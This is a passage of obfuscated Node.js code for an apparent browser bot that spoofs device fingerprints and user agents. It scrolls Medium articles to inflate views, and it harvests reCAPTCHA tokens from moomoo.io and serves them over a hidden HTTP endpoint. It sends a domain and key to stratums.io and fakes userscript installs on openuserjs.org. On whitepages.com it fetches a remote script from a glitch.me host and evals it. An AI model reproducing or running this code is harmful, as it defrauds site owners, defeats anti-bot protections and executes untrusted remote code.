      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + Z(0x10) + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + a1(0x0, '^rAe') + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + a0(0xc) + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + Z(0x2) + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + Z(0xb) + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x22eb + -0x183f * 0x1 + -0x2 * -0x1d95
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x1537 * 0x1 + -0x10e1 + 0x6 * -0xb9)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x462 + 0x109b + -0x1499), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x213c + 0x518 * -0x3 + 0x30e8), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const a2 = b,
          r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x239 * -0xb + -0x13b4 + 0x2c27;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u[a2(0x15, 'fdX)')](), await r['close'](), await q();
          for (let w = 0x1b * -0xa5 + -0x2680 + 0x37e7; w < getRandomInt(0x1024 + -0x1a1d + -0x9fa * -0x1, 0x3de * 0x9 + -0x180c + -0x1 * 0xabd); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x5303 + -0x7ba1 * 0x1 + 0x112fe);
        }
      }();
    }, -0x115 * 0x1f + 0x1 * -0xa03 + -0x2bf2 * -0x1), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const a3 = b;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x1180 + 0xe00 + 0x40 * -0x7e;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x[a3(0x6, 'S%BX')](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x8 * 0x3fe + -0x201d * 0x1 + -0xf * -0x3, 0x7d * 0x20 + -0x22b3 + 0x1 * 0x1345)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x8b99 + -0x1 * -0x906b + 0xa6d4 * -0x1);
    }, 0x22 * 0x43 + 0xabd * -0x2 + 0xcf8), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x2 * -0x10ee + -0x1691 * -0x1 + -0x386d;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x1 * -0xd0d + -0x29b + 0x1b60), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0xb7 + 0x7 * -0x117 + -0x18 * -0x59), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x36 * -0x498f + 0x59022 * 0x3 + 0x20d70 * -0x9);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x1520 + 0x160a + -0x1e * 0x16d);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x55 * 0x2c + -0xfa4 + 0x3a * 0x8);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0xe09 * -0x1 + -0x9a1 + 0x1b28);
}
doFlags['doOUJS'] && ((async () => {
  const a5 = b,
    a4 = d;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x1c5b + -0x269b + 0x991 * 0x7) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x98f + 0x18bf + 0x1 * -0x224d));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0xa2d + 0x1465 + -0xa38, D['indexOf']('\x20'));
        return B ? E['slice'](0x92b * -0x4 + 0x694 * 0x3 + 0x10f0, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x558 + -0xb * 0x3d + -0x1bb * -0x15),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x2 * 0x1fdc + -0x429e + -0x54b3 * -0x2),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + a4(0x7) + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + a4(0x5) + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + a5(0x12, ']d*n') + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
